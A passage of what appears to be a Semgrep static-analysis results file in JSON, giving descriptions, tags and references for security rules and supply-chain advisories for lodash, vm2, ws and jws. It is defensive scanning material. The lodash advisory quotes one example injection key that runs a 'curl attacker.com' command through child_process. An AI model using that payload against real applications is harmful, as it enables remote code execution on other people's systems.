Rule](https://semgrep.dev/r/javascript.express.web.tainted-redirect-express.tainted-redirect-express)\n - [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)\n - [https://owasp.org/Top10/A01_2021-Broken_Access_Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)\n","text":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site."},"helpUri":"https://semgrep.dev/r/javascript.express.web.tainted-redirect-express.tainted-redirect-express","id":"javascript.express.web.tainted-redirect-express.tainted-redirect-express","name":"javascript.express.web.tainted-redirect-express.tainted-redirect-express","properties":{"precision":"very-high","tags":["CWE-601: URL Redirection to Untrusted Site ('Open Redirect')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.web.tainted-redirect-express.tainted-redirect-express"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module)."},"help":{"markdown":"A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)\n","text":"A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module)."},"helpUri":"https://semgrep.dev/r/javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret","id":"javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret","name":"javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret","properties":{"precision":"very-high","tags":["CWE-798: Use of Hard-coded Credentials","HIGH CONFIDENCE","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The SHA1 hashing algorithm is considered to be weak. If this is used in any sensitive operation such as password hashing, or is used to ensure data integrity (collision sensitive) then you should use a stronger hashing algorithm. For passwords, consider using `Argon2id`, `scrypt`, or `bcrypt`. For data integrity, consider using `SHA-256`."},"help":{"markdown":"The SHA1 hashing algorithm is considered to be weak. If this is used in any sensitive operation such as password hashing, or is used to ensure data integrity (collision sensitive) then you should use a stronger hashing algorithm. For passwords, consider using `Argon2id`, `scrypt`, or `bcrypt`. For data integrity, consider using `SHA-256`.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.jssha.jssha-sha1.jssha-sha1)\n - [https://owasp.org/Top10/A02_2021-Cryptographic_Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures)\n","text":"The SHA1 hashing algorithm is considered to be weak. If this is used in any sensitive operation such as password hashing, or is used to ensure data integrity (collision sensitive) then you should use a stronger hashing algorithm. For passwords, consider using `Argon2id`, `scrypt`, or `bcrypt`. For data integrity, consider using `SHA-256`."},"helpUri":"https://semgrep.dev/r/javascript.jssha.jssha-sha1.jssha-sha1","id":"javascript.jssha.jssha-sha1.jssha-sha1","name":"javascript.jssha.jssha-sha1.jssha-sha1","properties":{"precision":"very-high","tags":["CWE-327: Use of a Broken or Risky Cryptographic Algorithm","LOW CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A03:2017 - Sensitive Data Exposure","OWASP-A04:2025 - Cryptographic Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.jssha.jssha-sha1.jssha-sha1"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM)."},"help":{"markdown":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.hardcoded.strings.detected-private-key.detected-private-key)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)\n","text":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM)."},"helpUri":"https://semgrep.dev/r/javascript.lang.hardcoded.strings.detected-private-key.detected-private-key","id":"javascript.lang.hardcoded.strings.detected-private-key.detected-private-key","name":"javascript.lang.hardcoded.strings.detected-private-key.detected-private-key","properties":{"precision":"very-high","tags":["CWE-798: Use of Hard-coded Credentials","MEDIUM CONFIDENCE","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.hardcoded.strings.detected-private-key.detected-private-key"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible."},"help":{"markdown":"Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.code-string-concat.code-string-concat)\n - [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)\n - [https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)\n - [https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/](https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/)\n - [https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html](https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html)\n","text":"Found data from an Express or Next web request flowing to `eval`. If this data is user-controllable this can lead to execution of arbitrary system commands in the context of your application process. Avoid `eval` whenever possible."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.code-string-concat.code-string-concat","id":"javascript.lang.security.audit.code-string-concat.code-string-concat","name":"javascript.lang.security.audit.code-string-concat.code-string-concat","properties":{"precision":"very-high","tags":["CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.code-string-concat.code-string-concat"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"RegExp() called with a `$ARG` function argument, this might allow an attacker to cause a Regular Expression Denial-of-Service (ReDoS) within your application as RegExP blocks the main thread. For this reason, it is recommended to use hardcoded regexes instead. If your regex is run on user-controlled input, consider performing input validation or use a regex checking/sanitization library such as https://www.npmjs.com/package/recheck to verify that the regex does not appear vulnerable to ReDoS."},"help":{"markdown":"RegExp() called with a `$ARG` function argument, this might allow an attacker to cause a Regular Expression Denial-of-Service (ReDoS) within your application as RegExP blocks the main thread. For this reason, it is recommended to use hardcoded regexes instead. If your regex is run on user-controlled input, consider performing input validation or use a regex checking/sanitization library such as https://www.npmjs.com/package/recheck to verify that the regex does not appear vulnerable to ReDoS.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp)\n - [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n","text":"RegExp() called with a `$ARG` function argument, this might allow an attacker to cause a Regular Expression Denial-of-Service (ReDoS) within your application as RegExP blocks the main thread. For this reason, it is recommended to use hardcoded regexes instead. If your regex is run on user-controlled input, consider performing input validation or use a regex checking/sanitization library such as https://www.npmjs.com/package/recheck to verify that the regex does not appear vulnerable to ReDoS."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp","id":"javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp","name":"javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","LOW CONFIDENCE","OWASP-A02:2025 - Security Misconfiguration","OWASP-A05:2021 - Security Misconfiguration","OWASP-A06:2017 - Security Misconfiguration","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Detected a hardcoded hmac key. Avoid hardcoding secrets and consider using an alternate option such as reading the secret from a config file or using an environment variable."},"help":{"markdown":"Detected a hardcoded hmac key. Avoid hardcoding secrets and consider using an alternate option such as reading the secret from a config file or using an environment variable.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key)\n - [https://rules.sonarsource.com/javascript/RSPEC-2068](https://rules.sonarsource.com/javascript/RSPEC-2068)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-management](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#key-management)\n","text":"Detected a hardcoded hmac key. Avoid hardcoding secrets and consider using an alternate option such as reading the secret from a config file or using an environment variable."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key","id":"javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key","name":"javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key","properties":{"precision":"very-high","tags":["CWE-798: Use of Hard-coded Credentials","LOW CONFIDENCE","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.hardcoded-hmac-key.hardcoded-hmac-key"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Possibility of prototype polluting function detected. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the software depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf). Possible mitigations might be: freezing the object prototype, using an object without prototypes (via Object.create(null) ), blocking modifications of attributes that resolve to object prototype, using Map instead of object."},"help":{"markdown":"Possibility of prototype polluting function detected. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the software depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf). Possible mitigations might be: freezing the object prototype, using an object without prototypes (via Object.create(null) ), blocking modifications of attributes that resolve to object prototype, using Map instead of object.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.prototype-pollution.prototype-pollution-loop.prototype-pollution-loop)\n - [https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n","text":"Possibility of prototype polluting function detected. By adding or modifying attributes of an object prototype, it is possible to create attributes that exist on every object, or replace critical attributes with malicious ones. This can be problematic if the software depends on existence or non-existence of certain attributes, or uses pre-defined attributes of object prototype (such as hasOwnProperty, toString or valueOf). Possible mitigations might be: freezing the object prototype, using an object without prototypes (via Object.create(null) ), blocking modifications of attributes that resolve to object prototype, using Map instead of object."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.prototype-pollution.prototype-pollution-loop.prototype-pollution-loop","id":"javascript.lang.security.audit.prototype-pollution.prototype-pollution-loop.prototype-pollution-loop","name":"javascript.lang.security.audit.prototype-pollution.prototype-pollution-loop.prototype-pollution-loop","properties":{"precision":"very-high","tags":["CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes","LOW CONFIDENCE","OWASP-A08:2021 - Software and Data Integrity Failures","OWASP-A08:2025 - Software or Data Integrity Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.prototype-pollution.prototype-pollution-loop.prototype-pollution-loop"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Cannot determine what '$UNK' is and it is used with a '<script>' tag. This could be susceptible to cross-site scripting (XSS). Ensure '$UNK' is not externally controlled, or sanitize this data."},"help":{"markdown":"Cannot determine what '$UNK' is and it is used with a '<script>' tag. This could be susceptible to cross-site scripting (XSS). Ensure '$UNK' is not externally controlled, or sanitize this data.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.unknown-value-with-script-tag.unknown-value-with-script-tag)\n - [https://www.developsec.com/2017/11/09/xss-in-a-script-tag/](https://www.developsec.com/2017/11/09/xss-in-a-script-tag/)\n - [https://github.com/juice-shop/juice-shop/blob/1ceb8751e986dacd3214a618c37e7411be6bc11a/routes/videoHandler.ts#L68](https://github.com/juice-shop/juice-shop/blob/1ceb8751e986dacd3214a618c37e7411be6bc11a/routes/videoHandler.ts#L68)\n","text":"Cannot determine what '$UNK' is and it is used with a '<script>' tag. This could be susceptible to cross-site scripting (XSS). Ensure '$UNK' is not externally controlled, or sanitize this data."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.unknown-value-with-script-tag.unknown-value-with-script-tag","id":"javascript.lang.security.audit.unknown-value-with-script-tag.unknown-value-with-script-tag","name":"javascript.lang.security.audit.unknown-value-with-script-tag.unknown-value-with-script-tag","properties":{"precision":"very-high","tags":["CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","LOW CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A07:2017 - Cross-Site Scripting (XSS)","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.unknown-value-with-script-tag.unknown-value-with-script-tag"}},{"defaultConfiguration":{"level":"note"},"fullDescription":{"text":"Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string."},"help":{"markdown":"Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring)\n - [https://cwe.mitre.org/data/definitions/134.html](https://cwe.mitre.org/data/definitions/134.html)\n","text":"Detected string concatenation with a non-literal variable in a util.format / console.log function. If an attacker injects a format specifier in the string, it will forge the log message. Try to use constant values for the format string."},"helpUri":"https://semgrep.dev/r/javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring","id":"javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring","name":"javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring","properties":{"precision":"very-high","tags":["CWE-134: Use of Externally-Controlled Format String","LOW CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.lang.security.audit.unsafe-formatstring.unsafe-formatstring"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The use of a weak cryptographic algorithm (e.g., SHA-1 or MD5) has been identified. These algorithms are considered insecure due to vulnerabilities that make them susceptible to collision attacks, allowing attackers to compromise data integrity or security. Replace SHA-1 or MD5 with secure hashing algorithms, such as: SHA-256 or higher (e.g., SHA-3)."},"help":{"markdown":"The use of a weak cryptographic algorithm (e.g., SHA-1 or MD5) has been identified. These algorithms are considered insecure due to vulnerabilities that make them susceptible to collision attacks, allowing attackers to compromise data integrity or security. Replace SHA-1 or MD5 with secure hashing algorithms, such as: SHA-256 or higher (e.g., SHA-3).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.node-stdlib.cryptography.crypto-weak-algorithm.crypto-weak-algorithm)\n - [https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)\n - [https://owasp.org/Top10/A02_2021-Cryptographic_Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures)\n","text":"The use of a weak cryptographic algorithm (e.g., SHA-1 or MD5) has been identified. These algorithms are considered insecure due to vulnerabilities that make them susceptible to collision attacks, allowing attackers to compromise data integrity or security. Replace SHA-1 or MD5 with secure hashing algorithms, such as: SHA-256 or higher (e.g., SHA-3)."},"helpUri":"https://semgrep.dev/r/javascript.node-stdlib.cryptography.crypto-weak-algorithm.crypto-weak-algorithm","id":"javascript.node-stdlib.cryptography.crypto-weak-algorithm.crypto-weak-algorithm","name":"javascript.node-stdlib.cryptography.crypto-weak-algorithm.crypto-weak-algorithm","properties":{"precision":"very-high","tags":["CWE-327: Use of a Broken or Risky Cryptographic Algorithm","HIGH CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A03:2017 - Sensitive Data Exposure","OWASP-A04:2025 - Cryptographic Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.node-stdlib.cryptography.crypto-weak-algorithm.crypto-weak-algorithm"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM)."},"help":{"markdown":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.sequelize.node-sequelize-hardcoded-secret-argument.node-sequelize-hardcoded-secret-argument)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)\n","text":"A secret is hard-coded in the application. Secrets stored in source code, such as credentials, identifiers, and other types of sensitive data, can be leaked and used by internal or external malicious actors. Use environment variables to securely provide credentials and other secrets or retrieve them from a secure vault or Hardware Security Module (HSM)."},"helpUri":"https://semgrep.dev/r/javascript.sequelize.node-sequelize-hardcoded-secret-argument.node-sequelize-hardcoded-secret-argument","id":"javascript.sequelize.node-sequelize-hardcoded-secret-argument.node-sequelize-hardcoded-secret-argument","name":"javascript.sequelize.node-sequelize-hardcoded-secret-argument.node-sequelize-hardcoded-secret-argument","properties":{"precision":"very-high","tags":["CWE-798: Use of Hard-coded Credentials","HIGH CONFIDENCE","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.sequelize.node-sequelize-hardcoded-secret-argument.node-sequelize-hardcoded-secret-argument"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements."},"help":{"markdown":"Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection)\n - [https://sequelize.org/docs/v6/core-concepts/raw-queries/#replacements](https://sequelize.org/docs/v6/core-concepts/raw-queries/#replacements)\n","text":"Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements."},"helpUri":"https://semgrep.dev/r/javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection","id":"javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection","name":"javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection","properties":{"precision":"very-high","tags":["CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')","HIGH CONFIDENCE","OWASP-A01:2017 - Injection","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead."},"help":{"markdown":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-013c16da-8fa9-440f-9ed4-482cb04a213a)\n - [https://github.com/advisories/GHSA-35jh-r3h4-6jhm](https://github.com/advisories/GHSA-35jh-r3h4-6jhm)\n - [https://github.com/advisories/GHSA-r5fr-rjxr-66jc](https://github.com/advisories/GHSA-r5fr-rjxr-66jc)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-4800](https://nvd.nist.gov/vuln/detail/CVE-2026-4800)\n","text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-013c16da-8fa9-440f-9ed4-482cb04a213a","id":"ssc-013c16da-8fa9-440f-9ed4-482cb04a213a","name":"ssc-013c16da-8fa9-440f-9ed4-482cb04a213a","properties":{"precision":"very-high","tags":["CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-013c16da-8fa9-440f-9ed4-482cb04a213a"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"vm2 versions before and including 3.9.19 are vulnerable to Sandbox Escape. `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code."},"help":{"markdown":"vm2 versions before and including 3.9.19 are vulnerable to Sandbox Escape. `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-020778f8-d42f-49f0-88bc-af77d7f9644b)\n - [https://github.com/advisories/GHSA-cchq-frgv-rjh5](https://github.com/advisories/GHSA-cchq-frgv-rjh5)\n - [https://nvd.nist.gov/vuln/detail/CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)\n","text":"vm2 versions before and including 3.9.19 are vulnerable to Sandbox Escape. `Promise` handler sanitization can be bypassed, allowing attackers to escape the sandbox and run arbitrary code."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-020778f8-d42f-49f0-88bc-af77d7f9644b","id":"ssc-020778f8-d42f-49f0-88bc-af77d7f9644b","name":"ssc-020778f8-d42f-49f0-88bc-af77d7f9644b","properties":{"precision":"very-high","tags":["CWE-653: Improper Isolation or Compartmentalization","CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-020778f8-d42f-49f0-88bc-af77d7f9644b"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of ws are vulnerable to NULL Pointer Dereference. A request with a number of headers exceeding the `server.maxHeadersCount` threshold could be used to crash a ws server."},"help":{"markdown":"Affected versions of ws are vulnerable to NULL Pointer Dereference. A request with a number of headers exceeding the `server.maxHeadersCount` threshold could be used to crash a ws server.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-05ec6d50-6068-8151-0449-0b9aa8e7d8f1)\n - [https://github.com/advisories/GHSA-3h5v-q93c-6h6q](https://github.com/advisories/GHSA-3h5v-q93c-6h6q)\n","text":"Affected versions of ws are vulnerable to NULL Pointer Dereference. A request with a number of headers exceeding the `server.maxHeadersCount` threshold could be used to crash a ws server."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-05ec6d50-6068-8151-0449-0b9aa8e7d8f1","id":"ssc-05ec6d50-6068-8151-0449-0b9aa8e7d8f1","name":"ssc-05ec6d50-6068-8151-0449-0b9aa8e7d8f1","properties":{"precision":"very-high","tags":["CWE-476: NULL Pointer Dereference","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-05ec6d50-6068-8151-0449-0b9aa8e7d8f1"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token forgery."},"help":{"markdown":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token forgery.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-0c587c32-681e-1011-91d9-b83299f66ccc)\n - [https://github.com/advisories/GHSA-869p-cjfg-cm3x](https://github.com/advisories/GHSA-869p-cjfg-cm3x)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-65945](https://nvd.nist.gov/vuln/detail/CVE-2025-65945)\n","text":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token 